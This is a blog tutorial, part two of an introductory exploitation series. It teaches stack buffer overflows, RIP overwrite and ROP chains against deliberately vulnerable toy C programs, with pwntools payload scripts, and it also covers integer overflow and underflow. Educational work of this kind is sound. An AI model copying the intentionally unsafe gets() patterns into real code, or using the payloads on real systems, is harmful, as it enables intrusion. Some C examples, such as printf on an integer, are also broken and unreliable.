---
title: Introduction to Pwning - Part 2
author: P0ch1ta
date: 2023-04-10 12:33:00 +0530
categories: [Pwning]
tags: [Buffer Overflow, ROP]
math: true
mermaid: true
---

This is the part two of simple pwning lecture series. The target of this series is to get started with pwning from the very basics to some advanced attack. We will be trying challenges from different CTFs as well to get familiar with the different exploitation vectors. In this lecture we will breifly try to understand how out code works and how can we get started with pwning.

# Buffer Overflow

## Basic buffer overflow

Starting with the simpleset and one of the most common attack a couple of decades ago is buffer overflow. This attack is going to serve as the base for the upcoming techniques that we are going to learn. 

So what is buffer overflow? A buffer overflow condition exists when a program attempts to put more data in a buffer than it can hold or when a program attempts to put data in a memory area past a buffer. 
eg.

```c
#include <stdio.h>

char buffer[40] = {"a"};
int a = 0x1;

int main(){
    printf("Whats your name?\n");
    gets(buffer);
    if(a==0xdeadbeef){
        printf("You did it.\n");
    }
    return 0;
}
```

If you compile the above code using the following command then you will get what would be a simple buffer overflow exploit

```bash
gcc chal.c -o chal -fno-stack-protector -static
```

## RIP control using buffer overflow

In case of variables stored on the stack we overflow the program stack and thus we can also overwrite the various registers that are present on the stack.

```c
#include <stdio.h>

void win(){
    printf("You win\n");
}

void vuln(){
    char buffer[40];
    printf("Whats your name?\n");
    gets(buffer);
}

int main(){
    vuln();
}
```

In this case we will analyse the program using `gef`. Lets us generate a pattern and give it as an input to the program to find the offset. To generate the pattern you can use the following command

```bash
pattern create (pattern length)
```
We will generate a pattern of length 100 and after giving it as input to the program we get the following result

<img src="https://raw.githubusercontent.com/manasghandat/manasghandat.github.io/master/assets/img/Images/Intro_to_pwn_2/1.png" alt="gef output">

As we can see we have overwritten the value of various registers and our program has given us `segmentation fault`. It is because we have overwritten the value of `RIP` register. We can find the exact offset of `RIP` register using the `pattern offset` command. The value of `RIP` register is stored after the `RBP` register, so we will find the offset to the `RBP` register and add 8 (size of register in `x64` architecture) to it in order to get the offset of `RIP` register.

```bash
pattern offset $rbp
```

We will get 2 values. From this we will choose the *little-endian* value as it is the architecture of the given challenge and add 8 to it. Using `pwntools` we can do the scripting to send the payload we want.

```py
from pwn import *

elf = context.binary = ELF("./chal",checksec=False)     # Loads the ELF file
p = elf.process()                                       # Starts the process

gdb.attach(p,''' 
    init-gef
''')                                                    # Attaches gdb so we can dynamically debug the challenge

offset = 48+8
payload = b"a"*offset + p64(0xdeadbeef)
p.sendline(payload)              

p.interactive()
```

<img src="https://raw.githubusercontent.com/manasghandat/manasghandat.github.io/master/assets/img/Images/Intro_to_pwn_2/2.png" alt="RIP overwrite">

As we can see we have sucessfully overwritten the value of `RIP` register. If we set the content of `RIP` register equal to the address of the `win` function then, it will be called. You can manually find the address of the `win` function using the command

```bash
objdump -d (file name) | grep (function name)
```

We can alse use `pwntools` to calculate the address. We can do it by using `elf.sym`. If we want the address of the `win` function then we can do
```py
addr = elf.sym.win
```

This way we will get the address of the function. You can try to write the exploit for this challenge yourself.

# Return Oriented Programming

In the above case we saw how we can all the function but many time we may need to provide correct arguments to the functions as well. 

Eg.

```c
#include <stdio.h>

void win(int param1){
    if(param1 == 0xdead){
        system("/bin/sh");
    }
}

void vuln(){
    char buffer[40];
    printf("Whats your name?\n");
    gets(buffer);
}

int main(){
    vuln();
}
```
In the above case even if we somehow call the `win` function we might not get shell as the value of `param1` might be different. In order to set the value of the parameters we need  **Return Oriented Programming(ROP)**. To set the parameters of the function we need to find the calling convention. 

In this case, we are using `x64` linux system. In `x64` calling convention, the first argument goes into the `RDI` register, second argument in the `RSI` register and so on. To set the value of these registers we will use various ropgadgets that are available.

<details>
<Summary>What are ROPgadets?</Summary>

ROP gadgets, short for "Return-Oriented Programming gadgets" are small pieces of code within a program's memory that can be used by attackers to construct an exploit that bypasses existing security measures. They are used in advanced exploitation techniques, such as return-oriented programming, to bypass memory protections like `NX`.

A ROP gadget is typically a small sequence of machine code that ends with a `ret` instruction, allowing the attacker to chain these gadgets together by manipulating the return addresses on the stack.
</details>

To find the ropgadgets in a binary you can use <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> or <a href="https://github.com/sashs/Ropper">ropper</a>. I will be using `ROPgadget` but you can usue any tool that you want.

## Writing the exploit

To dump the gadgets using `ROPgadgets` you can use the following command

```bash
ROPgadget --binary ./(file_name)
```
In the various gadgets that are given to us we will mainly be looking for `pop` gadgets. These tyoe of gadget will pop the value from top of the stack into the respective registers. Eg. The gadget `pop rdi; ret` will pop the value on top of the stack into the `RDI` register. Ideally we want to find simple gadgets like `pop rsi; ret` but sometimes they may not be available. In that case we may need to use complex gadgets like ` pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret` in order to control the contents of `RBP` register.

We can also chain various gadgets one after another to control the registers and set the exploit. Also we need to take care of the fact that the stack is properly alligned. In case if the stack is not properly alligned we may get error even if our exploit is correct. In such case we can add another simple `ret` gadget to allign the stack call the required function.

Eg:
```py
ret = 0x000000000040101a
rdi = 0x0000000000401ebf

payload1 = b"a" *offset + p64(rdi) + p64(0xdeadbeef) + p64(elf.sym.win) #Assume this is not correctly alligned
payload2 = b"a" *offset + p64(ret) + p64(rdi) + p64(0xdeadbeef) + p64(elf.sym.win)
p.sendline(payload2)
```

You can try to exploit the above challenge on your own in order to get idea of the exploitation vector. 

# Integer Underflow / Overflow

## Integer Underflow

Integer underflow occurs when a mathematical operation causes an integer variable to become smaller than its minimum representable value, resulting in unexpected behavior or vulnerability. This can happen when a program tries to subtract a larger value from a smaller value, causing the integer variable to *wrap around* and become a very large positive number or even a negative number, depending on the type of integer used.

Eg.
```c
#include <stdio.h>

int main(){
    unsigned int a = 0;
    a = -1;
    printf(a);
}
```

In this case we will get a very large integer value. Also a similar case might occur if we try to input negative number to unsigned integer.

```c
#include <stdio.h>

int main(){
    unsigned int a;
    gets(a);
    printf(a);
}
```
In case if we give input as `-1` then we might also get an integer underflow. 

## Integer Overflow

Integer overflows occur when a mathematical operation causes an integer variable to become larger than its maximum representable value, resulting in unexpected behavior or vulnerability. This can happen when a program tries to add or multiply two large values, causing the integer variable to "wrap around" and become a very small or negative number, depending on the type of integer used.

Eg.

```c
#include <stdio.h>

int a = __INT_MAX__ ;

int main(int argc, char const *argv[])
{
    a++;
    printf(a);
    return 0;
}
```
In this case the value of `a` will become negative. This is due to integer overflow.

# References

Article 1 : <a>https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame</a><br>
Article 2 : <a>https://www.geeksforgeeks.org/how-the-negative-numbers-are-stored-in-memory</a><br>
Article 3 : <a>https://www.scaler.com/topics/c/overflow-and-underflow-in-c</a>
